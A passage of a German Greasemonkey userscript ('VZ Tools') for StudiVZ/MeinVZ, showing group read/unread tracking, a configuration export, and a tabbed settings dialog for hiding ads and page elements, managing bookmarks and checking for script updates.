			       rows[i].getElementsByClassName('image')[0].style.backgroundColor = color2;
			       var link = rows[i].getElementsByTagName('a')[1].style.fontWeight = 'bold';
			       var icon = document.createElement('img');
			       icon.src = icon_unread;
			       icon.style.display = 'block';
			       icon.style.marginTop = '10px';
			       icon.setAttribute('groupid',groupid);
			       icon.setAttribute('groupcount',groupcount);
			       icon.style.cursor = 'pointer';
			       icon.addEventListener('click', markAsRead, false);
			       icon.setAttribute('title', 'Als gelesen markieren (Zwei mal klicken: Nicht mehr überwachen)');
			       rows[i].getElementsByClassName('entries')[0].appendChild(icon);			       
			     }
			   }
    }
  }
}

markAsRead = function(evt) {
  var row = evt.target.parentNode.parentNode;
  row.getElementsByClassName('entries')[0].style.fontWeight = 'normal';
	row.getElementsByClassName('updated')[0].style.fontWeight = 'normal';
	row.getElementsByClassName('updated')[0].style.backgroundColor = '#FFFFFF';
	row.getElementsByClassName('image')[0].style.backgroundColor = '#FFFFFF';

  evt.target.src = icon_read;
  evt.target.setAttribute('title','Nicht mehr überwachen (Zwei mal klicken: Als ungelesen markieren)');
  evt.target.addEventListener("click", markAsIgnored, false);
  GM_setValue(s_prefix + 'group'+evt.target.getAttribute('groupid'), evt.target.getAttribute('groupcount'));
  loadUnreadGroups(0, 1);
}

markAsUnread = function(evt) {
  var row = evt.target.parentNode.parentNode;
  row.getElementsByClassName('entries')[0].style.fontWeight = 'bold';
	row.getElementsByClassName('updated')[0].style.fontWeight = 'bold';
	row.getElementsByClassName('updated')[0].style.backgroundColor = color2;
	row.getElementsByClassName('image')[0].style.backgroundColor = color2;

  evt.target.src = icon_unread;
  evt.target.setAttribute('title','Als gelesen markieren (Zwei mal klicken: Nicht mehr überwachen)');
  evt.target.addEventListener("click", markAsRead, false);
  GM_setValue(s_prefix + 'group'+evt.target.getAttribute('groupid'), 0);
  loadUnreadGroups(0, 1);
}

markAsIgnored = function(evt) {
  evt.target.src = icon_ignore;
  evt.target.setAttribute('title','Als ungelesen markieren (Zwei mal klicken: Als gelesen markieren)');
  evt.target.addEventListener("click", markAsUnread, false);
  GM_setValue(s_prefix + 'group'+evt.target.getAttribute('groupid'), 'ignore');
  loadUnreadGroups(0, 1);
}

visitGroup = function() {
  if (window.location.href.indexOf('Groups/Overview') > -1) {
    var groupid = window.location.href.split('/')[window.location.href.split('/').length - 1];
    loadUnreadGroups(0, 1, groupid);
  }else if (window.location.href.indexOf('ThreadMessages/') > -1) {
    var groupid = window.location.href.split('/')[window.location.href.split('/').length - 2];
    loadUnreadGroups(0, 1, groupid);
  }else{
    loadUnreadGroups(0, 1);
  }
}

// == ENDE Gruppenfunktionen ==

// == BEGINN Wartungsfunktionen ==

exportConfig = function() {
  var wnd = window.open("about:blank");
  var doc = wnd.document;
  doc.write('<h1>VZ Tools Konfiguration</h1>');
  var list = GM_listValues();
  doc.write('<table><tr><th>Schlüssel</th><th>Wert</th></tr>');
  for (var i = 0; i < list.length; i++) {
    if (list[i].indexOf(s_prefix) == 0) {
      if ((list[i].indexOf('_friendslist') == -1) && (list[i].indexOf('_friends_cache') == -1) && (list[i].indexOf('_notes') == -1) && (list[i].indexOf('_note_') == -1)) {
        doc.write('<tr><td>'+list[i]+'</td><td>'+GM_getValue(list[i], 'nicht gesetzt')+'</td></tr>');
      }
    }
  }
  doc.write('</table>');
}

// == ENDE Wartungsfunktionen ==

// == BEGINN Konfiguration ==

var cdialog;

function swapTabs(evt) {
  var handles = document.getElementsByClassName('tabhandle');
  for (n = 0; n < handles.length; n++) {
    handles[n].wrappedJSObject.style.backgroundColor = 'transparent';
  }
  var pages = document.getElementsByClassName('tabpage');
  for (n = 0; n < pages.length; n++) {
    pages[n].wrappedJSObject.style.display = 'none';
  }
  evt.target.wrappedJSObject.style.backgroundColor = color2;
  switch(evt.target.wrappedJSObject.id) {
    case "handle1":
        document.getElementById('tab1').style.display = 'block';
      break;
    case "handle2":
        document.getElementById('tab2').style.display = 'block';
      break;
    case "handle3":
        document.getElementById('tab3').style.display = 'block';
      break;
    case "handle4":
        document.getElementById('tab4').style.display = 'block';
      break;
    case "handle5":
        document.getElementById('tab5').style.display = 'block';
      break;
    case "handle6":
        document.getElementById('tab6').style.display = 'block';
      break;
    case "handle7":
        document.getElementById('tab7').style.display = 'block';
      break;
  }
}

function showHelp() {
  showConfigDialog();
  var evObj = document.createEvent('MouseEvents');
  evObj.initEvent( 'click', true, true );
  document.getElementById('handle6').dispatchEvent(evObj);
}

config_displayWarning = function () {
  if (document.getElementById('vt_u_position').value == 1) {
    document.getElementById('calert').style.display = 'block';
  }else{
    document.getElementById('calert').style.display = 'none';
  }
}

function showConfigDialog() {

  var text = "";
	text += "<div id='handle1' class='tabhandle' style='background-color: "+color2+"; cursor: pointer; font-weight: bold; border: 1px solid "+color1+"; border-bottom: none; padding: 4px;float: left;'>Startseite</div>";
	text += "<div id='handle7' class='tabhandle' style='cursor: pointer; font-weight: bold; border: 1px solid  "+color1+"; border-bottom: none; border-left: none; padding: 4px;float: left;'>Überblick</div>";
	text += "<div id='handle2' class='tabhandle' style='cursor: pointer; font-weight: bold; border: 1px solid  "+color1+"; border-bottom: none; border-left: none; padding: 4px;float: left;'>Werbung</div>";
	text += "<div id='handle3' class='tabhandle' style='cursor: pointer; font-weight: bold; border: 1px solid  "+color1+"; border-bottom: none; border-left: none; padding: 4px;float: left;'>Benutzbarkeit</div>";
	text += "<div id='handle4' class='tabhandle' style='cursor: pointer; font-weight: bold; border: 1px solid  "+color1+"; border-bottom: none; border-left: none; padding: 4px;float: left;'>Wartung</div>";
	text += "<div id='handle5' class='tabhandle' style='cursor: pointer; font-weight: bold; border: 1px solid  "+color1+"; border-bottom: none; border-left: none; padding: 4px;float: left;'>Experimentell</div>";
	text += "<div id='handle6' class='tabhandle' style='cursor: pointer; font-weight: bold; border: 1px solid  "+color1+"; border-bottom: none; border-left: none; padding: 4px;float: left;'>Hilfe</div>";
	
  text += "<div style='position: relative; clear: both; width: 480px; height: 390px; border: 1px solid  "+color1+";'>";
  
  // Tab 1 "Startseite"
  text += "<div id='tab1' class='tabpage' style='width: 460px; padding: 10px; position: absolute; top: 0px; left: 0px;'>";
  
  text += "<h2>Spalten ausblenden</h2>";
  text += "<input type='checkbox' id='vt_f_remove_right' ";
  if (GM_getValue(s_prefix + 'hide_right_column', 0) == 1) {
    text += "checked";
  }
	text += "> Rechte Spalte ('Kennst Du schon?') ausblenden<br />";
	text += "<input type='checkbox' id='vt_f_remove_left' ";
  if (GM_getValue(s_prefix + 'hide_left_column', 0) == 1) {
    text += "checked";
  }
	text += "> Linke Spalte (Profilbild etc.) ausblenden<br /><br />";
	
	text += "<h2>Elemente ausblenden/umordnen</h2>";
	
	text += "<input type='checkbox' id='vt_f_hide_election' ";
  if (GM_getValue(s_prefix + 'hide_election', 0) == 1) {
    text += "checked";
  }
	text += "> &quot;Wahlzentrale&quot; ausblenden <br />";
	
	text += "<input type='checkbox' id='vt_f_remove_bush' ";
  if (GM_getValue(s_prefix + 'hide_bush', 0) == 1) {
    text += "checked";
  }
	text += "> &quot;Buschfunk&quot; ausblenden <br />";
	
	text += "<input type='checkbox' id='vt_f_remove_invitation' ";
  if (GM_getValue(s_prefix + 'hide_invitation', 0) == 1) {
    text += "checked";
  }
	text += "> &quot;Neue Leute einladen&quot; ausblenden ";
	
	text += "(<input type='checkbox' id='vt_f_remove_invitation_everywhere' ";
  if (GM_getValue(s_prefix + 'hide_invitation_everywhere', 0) == 1) {
    text += "checked";
  }
	text += "> Überall)<br />";
	
	text += "<input type='checkbox' id='vt_f_remove_kkadls' ";
  if (GM_getValue(s_prefix + 'hide_kkadls', 0) == 1) {
    text += "checked";
  }
	text += "> &quot;<span title='&quot;Kleiner Kasten Auf Der Linken Seite&quot;, die Infobox unterhalb der Navigationsleiste' style='border-bottom: 1px dotted #808080; cursor: help;'>KKADLS</span>&quot; ausblenden<br />";
	
	text += "<input type='checkbox' id='vt_f_swap_visitors' ";
  if (GM_getValue(s_prefix + 'swap_visitors', 0) == 1) {
    text += "checked";
  }
	text += "> Letzte Profilbesucher statt &quot;Kennst Du schon?&quot; anzeigen<br />";
	
	text += "<input type='checkbox' id='vt_f_toggle_gruschel' ";
  if (GM_getValue(s_prefix + 'toggle_gruschel', 0) == 1) {
    text += "checked";
  }
	text += "> Gruscheln zusammengefaßt anzeigen<br />";
	
	text += "<input type='checkbox' id='vt_f_hide_sms' ";
  if (GM_getValue(s_prefix + 'hide_sms', 0) == 1) {
    text += "checked";
  }
	text += "> &quot;SMS-Benachrichtigungen&quot; ausblenden<br /><br />";
	
	text += "<b>Hinweis:</b> Weitere Elemente der Startseite mit werblichem Charakter können auf der Seite 'Werbung' ausgeblendet werden.<br /><br />";
	
	text += "<h2>WebSlice</h2>";
	
	text += "<input type='checkbox' id='vt_f_show_webslice' ";
  if (GM_getValue(s_prefix + 'show_webslice', 0) == 1) {
    text += "checked";
  }
	text += "> WebSlice (Kurzüberblick über Dein Profil) auf der Startseite anzeigen<br /><br />";
	
  text += "</div>";

  // Tab 2 "Werbung"
  text += "<div id='tab2' class='tabpage' style='display: none; width: 460px; padding: 10px; position: absolute; top: 0px; left: 0px;'>";
  text += "<h2>Werbung auf der Startseite</h2>";
	text += "<input type='checkbox' id='vt_f_remove_showcase' ";
  if (GM_getValue(s_prefix + 'hide_showcase', 0) == 1) {
    text += "checked";
  }
	text += "> &quot;Schaufenster&quot; ausblenden<br />";
	text += "<input type='checkbox' id='vt_f_hide_news' ";
  if (GM_getValue(s_prefix + 'hide_news', 0) == 1) {
    text += "checked";
  }
	text += "> &quot;Neuigkeiten&quot; ausblenden<br />";
	text += "<input type='checkbox' id='vt_f_hide_news_select' ";
  if (GM_getValue(s_prefix + 'hide_news_select', 0) == 1) {
    text += "checked";
  }
	text += "> &quot;Neuigkeiten&quot; nur bei werblichen Inhalten ausblenden<br />";
	
	text += "<input type='checkbox' id='vt_f_remove_telegram' ";
  if (GM_getValue(s_prefix + 'hide_telegram', 0) == 1) {
    text += "checked";
  }  
	text += "> &quot;Telegramm&quot; ausblenden<br />";
	
	text += "<input type='checkbox' id='vt_f_remove_ahaoho' ";
  if (GM_getValue(s_prefix + 'hide_ahaoho', 0) == 1) {
    text += "checked";
  }
	text += "> &quot;Glückwunschkarte per Post&quot; (AhaOho) ausblenden<br />";
	text += "<input type='checkbox' id='vt_f_remove_vodafone' ";
  if (GM_getValue(s_prefix + 'hide_vodafone', 0) == 1) {
    text += "checked";
  }
	text += "> Buschfunk-Werbung (Vodafone) ausblenden<br /><br />";
	
	text += "<h2>Werbung außerhalb der Seite</h2>";
	text += "<input type='checkbox' id='vt_f_hide_banners' ";
  if (GM_getValue(s_prefix + 'hide_banners', 1) == 1) {
    text += "checked";
  }
	text += "> Bannerwerbung ausblenden<br />";
	text += "<input type='checkbox' id='vt_f_hide_policy' ";
  if (GM_getValue(s_prefix + 'hide_policy', 1) == 1) {
    text += "checked";
  }
	text += "> Datenschutz-Symbole ausblenden<br /><br />";
  text += "</div>";
  
  // Tab 3 "Benutzbarkeit"
  
  text += "<div id='tab3' class='tabpage' style='display: none; width: 460px; padding: 10px; position: absolute; top: 0px; left: 0px;'>";
  text += "<h2>Allgemeine Ärgernisse</h2>";
	text += "<input type='checkbox' id='vt_f_allow_savepics' ";
  if (GM_getValue(s_prefix + 'allow_savepics', 1) == 1) {
    text += "checked";
  }
	text += "> Abspeichern von Bildern ermöglichen<br />";
	text += "<input type='checkbox' id='vt_f_pin_menu' ";
  if (GM_getValue(s_prefix + 'pin_menu', 1) == 1) {
    text += "checked";
  }
	text += "> Hauptmenü fixieren<br />";
	text += "<input type='checkbox' id='vt_f_fix_backlinks' ";
  if (GM_getValue(s_prefix + 'fix_backlinks', 1) == 1) {
    text += "checked";
  }
	text += "> Probleme mit dem &quot;Zurück&quot;-Button beheben<br /><br />";
	text += "<h2>Funktionserweiterungen</h2>";
	text += "<input type='checkbox' id='vt_f_use_bookmarks' ";
  if (GM_getValue(s_prefix + 'use_bookmarks', 1) == 1) {
    text += "checked";
  }
	text += "> Benutzer-Notizen und Bookmarks einschalten<br />";
	
	text += "<input type='checkbox' id='vt_f_show_bookmarks' ";
  if (GM_getValue(s_prefix + 'show_bookmarks', 0) == 1) {
    text += "checked";
  }
	text += "> Benutzer-Notizen auf der Startseite anzeigen<br />";
	
	text += "<input type='checkbox' id='vt_f_bookmark_tabs' ";
  if (GM_getValue(s_prefix + 'bookmark_tabs', 0) == 1) {
    text += "checked";
  }
	text += "> Bookmarks in neuem Tab öffnen<br />";
	
	
	text += '<select id="managebookmarks" size="1">';
  text += "<option value='' selected>-- Bookmarks verwalten --</option>";
  var list = GM_listValues();
  var bookmarks_available = false;
  for (var i = 0; i < list.length; i++) {
    if (list[i].indexOf(s_prefix + 'bkm_') > -1) {
      var target = list[i].split('bkm_')[1];
      text += "<option value='"+list[i]+"'>"+GM_getValue(list[i], '')+"</option>";
      bookmarks_available = true;
    }
  }
  text += '</select><input type="button" id="delbookmark" value="Löschen" />';
  
  text += '<br />';
  
  text += "<input type='checkbox' id='vt_f_zoom_pics' ";
  if (GM_getValue(s_prefix + 'zoom_pics', 0) == 1) {
    text += "checked";
  }
	text += "> Profilbilder bei Mausberührung vergrößern<br />";
	
	text += "<input type='checkbox' id='vt_f_nerv_gruschel' ";
  if (GM_getValue(s_prefix + 'nerv_gruschel', 1) == 1) {
    text += "checked";
  }
	text += "> Nervige Gruschler ausblenden <a href='#' id='ragruschel'>[zurücksetzen]</a><br />";
	
	text += "<input type='checkbox' id='vt_f_enable_groups' ";
  if (GM_getValue(s_prefix + 'enable_groups', 1) == 1) {
    text += "checked";
  }
	text += "> Gruppenfunktionen aktivieren<br /><br />";
	
	text += '<h2>Interoperabilität</h2>';
	text += "<input type='checkbox' id='vt_f_add_share' ";
  if (GM_getValue(s_prefix + 'add_share', 1) == 1) {
    text += "checked";
  }
	text += '> &quot;Share&quot;-Links anzeigen<br /><br />';
	
	text += "<h2>Kleinigkeiten</h2>";
	text += "<input type='checkbox' id='vt_f_add_logout' ";
  if (GM_getValue(s_prefix + 'add_logout', 0) == 1) {
    text += "checked";
  }
	text += "> Zusätzlicher Logout-Link in der linken Navigationsleiste<br />";
	
	text += "</div>";

  // Tab 4: "Wartung"
  text += "<div id='tab4' class='tabpage' style='display: none; width: 460px; padding: 10px; position: absolute; top: 0px; left: 0px;'>";
  text += "<h2>Sonstiges und Wartung</h2>";
	text += "&raquo; <a href='javascript:void(null)' id='v_reset'>Gespeicherte Informationen zurücksetzen</a><br />";
	text += "&raquo; <a href='javascript:void(null)' id='v_export'>Freundesliste exportieren</a><br /><br />";
	text += "&raquo; <a href='javascript:void(null)' id='v_defect'>Defekte User-Notizen entfernen</a><br /><br />";
	text += "&raquo; <a href='javascript:void(null)' id='v_hidden'>Ausgeblendete Microblogs reaktivieren</a><br /><br />";
	text += "&raquo; <a href='javascript:void(null)' id='v_exportconfig'>Konfiguration ausgeben</a><br /><br />";
	text += "<h2>Skript-Updates</h2>";
	text += "Du setzt derzeit die Skript-Version "+version+" ein. ";
	if (version != global_update) {
	  text += "<br /><b>Aktuell ist jedoch die Version "+global_update+".</b><br /><br />";
	  text += "<center><a href='http://userscripts.org/scripts/source/38483.user.js'><big><b>Jetzt updaten!</b></big></a></center><br /><br />";
	}else{
	  text += "Damit bist Du auf dem neuesten Stand.<br />";
	  text += "<br />";
	  text += "&raquo; <a href='javascript:void(null)' id='v_update'>jetzt auf Skript-Updates prüfen</a><br />";
	}
	text += "</div>";
	
	// Tab 5: "Experimentell"
  text += "<div id='tab5' class='tabpage' style='display: none; width: 460px; padding: 10px; position: absolute; top: 0px; left: 0px;'>";
  text += "<h2>Experimentelle Funktionen</h2>";
  //text += "Aktuell sind keine experimentellen Funktionen verfügbar.<br /><br />";
  //text += "<input type='checkbox' id='vt_f_wide_vz' ";
  //if (GM_getValue(s_prefix + 'wide_vz', 0) == 1) {
  //  text += "checked";
  //}
	//text += "> WideVZ aktivieren<br /><i>Breitet den Anzeigebereich auf die gesamte Bildschirmbreite aus</i><br /><br />";
	
	text += "<b>jetVZ</b> installieren:<br />";
	text += "jetVZ ist ein innovatives Tool für Deinen Browser, mit dem Dir stets ein Überblick über Deine StudiVZ/MeinVZ-Mitgliedschaft in der Browser-Statusleiste angezeigt wird.<br />";
	text += "jetVZ basiert auf Mozilla JetPack, einer Erweiterung ähnlich Greasemonkey, die jedoch direkt im Browser läuft. Um jetVZ zu nutzen, mußt Du zunächst JetPack installieren:<br /><br />";
	text += "&raquo; <a href='https://addons.mozilla.org/en-US/firefox/downloads/latest/12025/addon-12025-latest.xpi'>Mozilla JetPack installieren</a><br /><br />";
	text += "Nach einem Browser-Neustart kannst Du dann jetVZ direkt von userscripts.org installieren:<br /><br />";
	text += "<i>Die Vorab-Version von jetVZ steht noch nicht zur Verfügung</i><br /><br />";
	
	text += "<div style='display: none;'><input type='checkbox' id='vt_f_use_toolbar' ";
  if (GM_getValue(s_prefix + 'use_toolbar', 0) == 1) {
    text += "checked";
  }
	text += "> Taskbar verwenden<br /><i>Blendet eine Taskbar im Stil von Facebook ein</i><br /><br /></div>";
	text += "<h2>Warnung</h2>";
	text += "<b>Die Funktionen, die sich hier aktivieren lassen, befinden sich noch in Entwicklung. Es ist davon auszugehen, daß Fehlfunktionen auftreten oder daß einzelne Funktionselemente nicht verfügbar sind.</b>";
	text += "</div>";
	
	// Tab 6: "Hilfe"
	text += "<div id='tab6' class='tabpage' style='display: none; width: 460px; padding: 10px; position: absolute; top: 0px; left: 0px;'>";
	text += "<h2>Hilfe, Support und Feature Requests</h2>";
	text += "Das Skript funktioniert nicht so wie es soll, Du hast Anregungen oder es zerreißt Dir die komplette Seite oder andere Skripts?<br />";
	text += "&raquo; <a href='http://userscripts.org/scripts/discuss/38483' target='_blank'>Zum Diskussionsforum</a><br />";
	text += "&raquo; <a href='/Groups/Overview/f1b245e816b2c967'>Zur Support-Gruppe (StudiVZ/MeinVZ)</a><br /><br />";
	text += "<h2>Neuigkeiten?</h2>";
	text += "Du willst wissen, welche Features die neueste Version hinzugefügt hat?<br />";
	text += "&raquo; <a href='http://userscripts.org/scripts/show/38483' target='_blank'>Zur Projektseite</a><br /><br />";
	text += "<h2>Große Klasse!</h2>";
	text += "Du findest das Skript ganz toll oder grottenschlecht?<br />";
	text += "&raquo; <a href='http://userscripts.org/scripts/reviews/38483' target='_blank'>Schreibe eine Rezension!</a><br /><br />";
	if (siteName != 'schuelervz') {
	  text += "<h2>Den Autor mal gruscheln?</h2>";
	  text += "Aber gern doch: ";
	  text += "<a href='"+url+"Gruscheln/DialogGruscheln/e4ebb3181353c6ef/'>[Gruscheln]</a><br /><br />";
	  text += "<b>Wichtige Bitte:</b> Fehlermeldungen und Problemberichte bitte nicht auf meine Pinnwand posten oder mir per Mail schreiben. Bitte verwendet hierzu die entsprechenden Foren.<br /><br />";
	}
	text += "<h2>Weitersagen</h2>";
	text += "Du findest die VZ Tools so toll, daß Du sie Deinen Freunden weiterempfehlen willst? Nichts einfacher als das: <a href='/Suggest/SuggestForm/?u=http%3A%2F%2Fuserscripts.org%2Fscripts%2Fshow%2F38483%2F&desc=Du willst ein paar zusätzliche Funktionen für studiVZ oder meinVZ haben? Mit Firefox, dem Greasemonkey-Plugin und diesem Skript bekommst Du mit ein paar Mausklicks eine Fülle an neuen und verbesserten Funktionen!&prov=VZ Tools'>[weiterempfehlen]</a>";
	text += "</div>";
	
	// Tab 7: "Überblick"
	text += "<div id='tab7' class='tabpage' style='display: none; width: 460px; padding: 10px; position: absolute; top: 0px; left: 0px;'>";
	
	text += "<h2>Überblick</h2>";
	text += "<input type='checkbox' id='vt_f_show_guestbook' ";
  if (GM_getValue(s_prefix + 'f_guestbook', 1) == 1) {
    text += "checked";
  }
	text += "> Anzahl von Pinnwandeinträgen anzeigen<br />";
	text += "<input type='checkbox' id='vt_f_show_gb_last_author' ";
  if (GM_getValue(s_prefix + 'f_gb_last_author', 0) == 1) {
    text += "checked";
  }
	text += "> Autor des letzten Beitrags anzeigen<br />";
	text += "<input type='checkbox' id='vt_f_show_pictures' ";
  if (GM_getValue(s_prefix + 'f_pictures', 1) == 1) {
    text += "checked";
  }
	text += "> Anzahl von Bildverlinkungen anzeigen<br />";
	
	text += "Position: <select size='1' id='vt_u_position'>";
	text += "<option value='1' ";
  if (GM_getValue(s_prefix + 'u_position', 0) == 1) {
    text += "selected";
  }
	text += ">Oberhalb der Aktivitätsliste (klassisch, nur auf der Startseite)</option>";
	text += "<option value='0' ";
  if (GM_getValue(s_prefix + 'u_position', 0) == 0) {
    text += "selected";
  }
	text += ">Oberhalb der Navigationsleiste (verfügbar auf allen Seiten)</option>";
	text += "<option value='2' ";
  if (GM_getValue(s_prefix + 'u_position', 0) == 2) {
    text += "selected";
  }
	text += ">Unterhalb der Navigationsleiste (verfügbar auf allen Seiten)</option>";
	text += "</select><br /><br />";
	
	text += "<div style='font-size: 7pt; margin-bottom: 5px; background-color: #ffff80; border: 1px solid #c0c000; display: none; padding: 10px;' id='calert'>";
	text += "<b>Achtung</b>: Die von Dir ausgewählte Einstellung funktioniert nur, wenn der Freundesüberblick auf der Startseite nicht deaktiviert ist! Schalte ggf. die Anzeige von Profilaktualisierungen und Microblogs aus.";
	text += "</div>";
	
  text += "<h2>'Was machen Deine Freunde?'</h2>";
  text += "<input type='checkbox' id='vt_f_show_details' ";
  if (GM_getValue(s_prefix + 'f_details', 1) == 1) {
    text += "checked";
  }
	text += "> Details zu Aktivitäten Deiner Freunde anzeigen<br />";
	text += "<input type='checkbox' id='vt_f_show_details_tabular' ";
  if (GM_getValue(s_prefix + 'f_details_tabular', 1) == 1) {
    text += "checked";
  }
	text += "> Details tabellarisch anzeigen<br />";
  text += "<input type='checkbox' id='vt_f_show_profile' ";
  if (GM_getValue(s_prefix + 'f_profile', 1) == 1) {
    text += "checked";
  }
	text += "> Profil-Aktualisierungen anzeigen<br />";
  text += "<input type='checkbox' id='vt_f_show_status' ";
  if (GM_getValue(s_prefix + 'f_status', 1) == 1) {
    text += "checked";
  }
	text += "> Microblogs anzeigen<br />";
  text += "Maximale Anzahl von Profilaktualisierungen auf der Startseite: <input type='text' size='2' maxlength='2' id='vt_f_max' ";
  text += "value='"+GM_getValue(s_prefix + 'f_num',4)+"'";
	text += "/> (max. 15)<br />";
	text += "Maximale Anzahl von Stati auf der Startseite: <input type='text' size='2' maxlength='2' id='vt_f_bush' ";
  text += "value='"+GM_getValue(s_prefix + 'bush_num',6)+"'";
	text += "/> (max. 45)<br />";
	
  text += "Position: <select size='1' id='vt_f_position' >";
  text += "<option value='0' ";
  if (GM_getValue(s_prefix + 'f_position', 0) == 0) {
    text += "selected";
  }
	text += ">Feld &quot;Was machst Du gerade?&quot; ersetzen</option>";
  text += "<option value='1' ";
  if (GM_getValue(s_prefix + 'f_position', 0) == 1) {
    text += "selected";
  }
	text += ">Unterhalb des Felds &quot;Was machst Du gerade?&quot;</option>";
	text += "</select><br />";
	
	text += "Automatisch aktualisieren: <select size='1' id='vt_f_refresh' >";
  text += "<option value='0' ";
  if (GM_getValue(s_prefix + 'f_refresh', 0) == 0) {
    text += "selected";
  }
	text += ">nicht aktualisieren</option>";
  text += "<option value='60000' ";
  if (GM_getValue(s_prefix + 'f_refresh', 0) == 60000) {
    text += "selected";
  }
	text += ">1 mal pro Minute</option>";
	text += "<option value='300000' ";
  if (GM_getValue(s_prefix + 'f_refresh', 0) == 300000) {
    text += "selected";
  }
	text += ">alle 5 Minuten</option>";
	text += "<option value='600000' ";
  if (GM_getValue(s_prefix + 'f_refresh', 0) == 600000) {
    text += "selected";
  }
	text += ">alle 10 Minuten</option>";
	text += "</select><br /><br />";
	
	text += "</div>";
  
	text += "</div><br />";

	
  text += '<br /><br /><center><a href="javascript:void(null)" id="savecd" ><b>[Speichern]</b></a> <a href="javascript:void(null)" id="closecd" ><b>[Abbrechen]</b></a></center>';
  cdialog = unsafeWindow.Phx.UI.Dialog.ButtonDialog(
                        'VZ Tools - Einstellungen',
                        {
                            'message' : text,
                            'buttons' : [ ]
                        });
  cdialog.show();
  if (document.getElementById('v_update')) {
    document.getElementById('v_update').addEventListener('click',updateScript,false);
  }
  document.getElementById('vt_u_position').addEventListener('change',config_displayWarning,false);
  
  document.getElementById('v_hidden').addEventListener('click',removeHiddenMB,false);
  document.getElementById('v_defect').addEventListener('click',removeEmptyNotes,false);
  document.getElementById('v_reset').addEventListener('click',resetFriends,false);
  document.getElementById('v_export').addEventListener('click',exportFriends,false);
  document.getElementById('v_exportconfig').addEventListener('click',exportConfig,false);
  document.getElementById('closecd').addEventListener('click',function (e) {cdialog.close();},false);
  document.getElementById('savecd').addEventListener('click',saveVZTConfig,false);
  document.getElementById('delbookmark').addEventListener('click',deleteBookmark,false);
  document.getElementById('ragruschel').addEventListener('click',resetAnnoyingGruschel,false);
  
  document.getElementById('handle1').addEventListener('click', swapTabs, false);
  document.getElementById('handle2').addEventListener('click', swapTabs, false);
  document.getElementById('handle3').addEventListener('click', swapTabs, false);
  document.getElementById('handle4').addEventListener('click', swapTabs, false);
  document.getElementById('handle5').addEventListener('click', swapTabs, false);
  document.getElementById('handle6').addEventListener('click', swapTabs, false);
  document.getElementById('handle7').addEventListener('click', swapTabs, false);
}

function deleteBookmark() {
  var bookmark = document.getElementById('managebookmarks').value;
  if (bookmark != "") {
    GM_deleteValue(bookmark);
    alert('Der Bookmark wurde gelöscht');
  }
}

function saveVZTConfig() {
  GM_setValue(s_prefix + 'f_position', document.getElementById('vt_f_position').value);
  GM_setValue(s_prefix + 'u_position', document.getElementById('vt_u_position').value);
  
  if (document.getElementById('vt_f_show_details').checked) {
    GM_setValue(s_prefix + 'f_details',1);
  }else{
    GM_setValue(s_prefix + 'f_details',0);
  }
  if (document.getElementById('vt_f_show_details_tabular').checked) {
    GM_setValue(s_prefix + 'f_details_tabular',1);
  }else{
    GM_setValue(s_prefix + 'f_details_tabular',0);
  }
  if (document.getElementById('vt_f_show_profile').checked) {
    GM_setValue(s_prefix + 'f_profile',1);
  }else{
    GM_setValue(s_prefix + 'f_profile',0);
  }
  if (document.getElementById('vt_f_show_status').checked) {
    GM_setValue(s_prefix + 'f_status',1);
  }else{
    GM_setValue(s_prefix + 'f_status',0);
  }
  GM_setValue(s_prefix + 'f_num', document.getElementById('vt_f_max').value);
  GM_setValue(s_prefix + 'bush_num', document.getElementById('vt_f_bush').value);
  if (document.getElementById('vt_f_remove_left').checked) {
    GM_setValue(s_prefix + 'hide_left_column',1);
  }else{
    GM_setValue(s_prefix + 'hide_left_column',0);
  }
  if (document.getElementById('vt_f_remove_right').checked) {
    GM_setValue(s_prefix + 'hide_right_column',1);
  }else{
    GM_setValue(s_prefix + 'hide_right_column',0);
  }
  if (document.getElementById('vt_f_remove_bush').checked) {
    GM_setValue(s_prefix + 'hide_bush',1);
  }else{
    GM_setValue(s_prefix + 'hide_bush',0);
  }
  if (document.getElementById('vt_f_remove_showcase').checked) {
    GM_setValue(s_prefix + 'hide_showcase',1);
  }else{
    GM_setValue(s_prefix + 'hide_showcase',0);
  }
  if (document.getElementById('vt_f_remove_telegram').checked) {
    GM_setValue(s_prefix + 'hide_telegram',1);
  }else{
    GM_setValue(s_prefix + 'hide_telegram',0);
  }
  if (document.getElementById('vt_f_remove_ahaoho').checked) {
    GM_setValue(s_prefix + 'hide_ahaoho',1);
  }else{
    GM_setValue(s_prefix + 'hide_ahaoho',0);
  }
  if (document.getElementById('vt_f_remove_vodafone').checked) {
    GM_setValue(s_prefix + 'hide_vodafone',1);
  }else{
    GM_setValue(s_prefix + 'hide_vodafone',0);
  }
  if (document.getElementById('vt_f_remove_invitation').checked) {
    GM_setValue(s_prefix + 'hide_invitation',1);
  }else{
    GM_setValue(s_prefix + 'hide_invitation',0);
  }
  if (document.getElementById('vt_f_remove_kkadls').checked) {
    GM_setValue(s_prefix + 'hide_kkadls',1);
  }else{
    GM_setValue(s_prefix + 'hide_kkadls',0);
  }
  if (document.getElementById('vt_f_remove_invitation_everywhere').checked) {
    GM_setValue(s_prefix + 'hide_invitation_everywhere',1);
  }else{
    GM_setValue(s_prefix + 'hide_invitation_everywhere',0);
  }
  if (document.getElementById('vt_f_hide_banners').checked) {
    GM_setValue(s_prefix + 'hide_banners',1);
  }else{
    GM_setValue(s_prefix + 'hide_banners',0);
  }
  if (document.getElementById('vt_f_allow_savepics').checked) {
    GM_setValue(s_prefix + 'allow_savepics',1);
  }else{
    GM_setValue(s_prefix + 'allow_savepics',0);
  }
  if (document.getElementById('vt_f_use_bookmarks').checked) {
    GM_setValue(s_prefix + 'use_bookmarks',1);
  }else{
    GM_setValue(s_prefix + 'use_bookmarks',0);
  }
  if (document.getElementById('vt_f_swap_visitors') && document.getElementById('vt_f_swap_visitors').checked) {
    GM_setValue(s_prefix + 'swap_visitors',1);
  }else{
    GM_setValue(s_prefix + 'swap_visitors',0);
  }
  if (document.getElementById('vt_f_show_bookmarks').checked) {
    GM_setValue(s_prefix + 'show_bookmarks',1);
  }else{
    GM_setValue(s_prefix + 'show_bookmarks',0);
  }
  if (document.getElementById('vt_f_hide_news').checked) {
    GM_setValue(s_prefix + 'hide_news',1);
  }else{
    GM_setValue(s_prefix + 'hide_news',0);
  }
  if (document.getElementById('vt_f_hide_news_select').checked) {
    GM_setValue(s_prefix + 'hide_news_select',1);
  }else{
    GM_setValue(s_prefix + 'hide_news_select',0);
  }
  if (document.getElementById('vt_f_use_toolbar').checked) {
    GM_setValue(s_prefix + 'use_toolbar',1);
  }else{
    GM_setValue(s_prefix + 'use_toolbar',0);
  }
  if (document.getElementById('vt_f_add_logout').checked) {
